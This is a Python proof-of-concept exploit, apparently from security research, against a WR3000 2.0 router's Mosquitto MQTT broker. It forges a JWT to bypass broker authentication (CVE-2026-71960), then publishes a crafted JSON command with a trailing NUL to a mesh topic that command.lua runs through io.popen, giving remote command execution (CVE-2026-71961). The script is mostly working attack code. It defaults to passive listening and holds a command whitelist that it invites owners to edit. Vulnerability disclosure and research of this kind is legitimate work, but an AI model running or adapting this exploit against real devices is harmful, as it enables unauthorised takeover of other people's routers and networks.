#!/usr/bin/env python3
"""
mqtt_takeover.py - authenticate to a WR3000 2.0 Mosquitto broker with a
forged JWT (CVE-2026-71960) and exercise the mesh command interface
(CVE-2026-71961 - only with --cmd, against hardware you own).

Default behaviour is passive: CONNECT, subscribe to the role's ACL read
pattern, print traffic, exit. Nothing is published unless --cmd is passed.

The verified single-node command chain uses the satellite role. A forged
"cudydevice" JWT can write router/000000000000/+/+/+/+; the admin's own
subscription reads it; command.lua trusts src_did=000000000000 and runs the
JSON "cmd" through io.popen. The payload needs a trailing NUL for the C-side
JSON sniff (payload[payloadlen-2] == '}').

Usage:
    python3 mqtt_takeover.py --host 192.168.10.1 --port 1883 \
        --deviceid cudydevice --role satellite --secret '<secret>' [--listen 30]
    python3 mqtt_takeover.py --host ... --deviceid cudydevice --role satellite \
        --secret '<secret>' --cmd 'id > /tmp/proof.txt'
    python3 mqtt_takeover.py --host ... --deviceid cudydevice --role admin \
        --secret '<secret>'

Requires: paho-mqtt  (pip install paho-mqtt)
Authorised research only.
"""
import argparse
import json
import sys
import time

from forge_jwt import forge

TOPIC_SATELLITE_READ = "router/+/000000000000/+/+/+"
TOPIC_ADMIN_READ = "router/000000000000/+/+/+/+"
CMD_TOPIC_FMT = "router/{controller}/{satellite}/{seq}/router/command"
ROLES = {"satellite": "cudydevice", "admin": "admincudydevice"}


def on_connect(client, userdata, flags, rc, props=None):
    if rc == 0:
        print("[+] CONNACK rc=0 - broker accepted the forged JWT")
        client.subscribe(userdata["subscribe"])
        print(f"[+] subscribe requested: {userdata['subscribe']} (ACL file applies)")
    else:
        print(f"[!] CONNACK rc={rc} - rejected")
        userdata["failed"] = True


def on_subscribe(client, userdata, mid, granted_qos, props=None):
    print(f"[+] SUBACK mid={mid} granted={granted_qos}")
    if 0x80 in granted_qos:
        print("[!] subscription denied by the ACL")


def on_message(client, userdata, msg):
    body = msg.payload.decode(errors="replace")
    print(f"[msg] {msg.topic}: {body[:400]}")
    if '"data"' in body and "uid=" in body:
        print("[+] command output received - CVE-2026-71961 chain complete")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=1883)
    ap.add_argument("--deviceid", default="cudydevice",
                    help="bdinfo deviceid the plugin checks for (default cudydevice)")
    ap.add_argument("--role", choices=tuple(ROLES), default="satellite",
                    help="ACL role; sets the exact MQTT username")
    ap.add_argument("--username", help="override the exact ACL username (must contain --deviceid)")
    ap.add_argument("--secret", required=True, help="bdinfo secret")
    ap.add_argument("--subscribe", default=None,
                    help="override the role's ACL read pattern")
    ap.add_argument("--controller", default="000000000000",
                    help="dst_did for --cmd (default controller sentinel)")
    ap.add_argument("--satellite", default="000000000000",
                    help="src_did for --cmd (default controller sentinel; the admin's own topic)")
    ap.add_argument("--seq", type=int, default=7, help="topic sequence number (default 7)")
    ap.add_argument("--cmd", default=None,
                    help="command string for command.lua (CVE-2026-71961). "
                         "Adds a trailing NUL. Use ONLY on hardware you own.")
    ap.add_argument("--listen", type=int, default=20, help="seconds to listen")
    args = ap.parse_args()

    username = args.username or ROLES[args.role]
    if args.deviceid not in username:
        sys.exit(f"[!] username {username!r} does not contain the bdinfo deviceid {args.deviceid!r}")

    import paho.mqtt.client as mqtt
    token = forge(args.deviceid, args.secret, username=username)
    print(f"[*] CONNECT {args.host}:{args.port} user={username} role={args.role}")

    userdata = {
        "subscribe": args.subscribe or (
            TOPIC_SATELLITE_READ if args.role == "satellite" else TOPIC_ADMIN_READ),
        "failed": False,
    }
    c = mqtt.Client(client_id="hb-research", protocol=mqtt.MQTTv311)
    c.username_pw_set(username, token)
    c.on_connect = on_connect
    c.on_subscribe = on_subscribe
    c.on_message = on_message
    c.user_data_set(userdata)
    c.connect(args.host, args.port, keepalive=30)
    c.loop_start()
    time.sleep(2)

    if userdata["failed"]:
        c.loop_stop()
        sys.exit(1)

    if args.cmd:
        if not args.cmd.startswith(("id", "uname", "echo", "true")):
            print("[!] refusing to run non-benign commands - edit the whitelist "
                  "in your own copy if you truly own the target")
            c.loop_stop()
            sys.exit(1)
        topic = CMD_TOPIC_FMT.format(controller=args.controller,
                                     satellite=args.satellite, seq=args.seq)
        payload = json.dumps({"cmd": args.cmd, "reply": 1}).encode() + b"\x00"
        print(f"[*] publishing (CVE-2026-71961): {topic} {payload!r}")
        c.publish(topic, payload)

    print(f"[*] listening {args.listen}s ...")
    time.sleep(args.listen)
    c.loop_stop()
    print("[*] done")


if __name__ == "__main__":
    main()
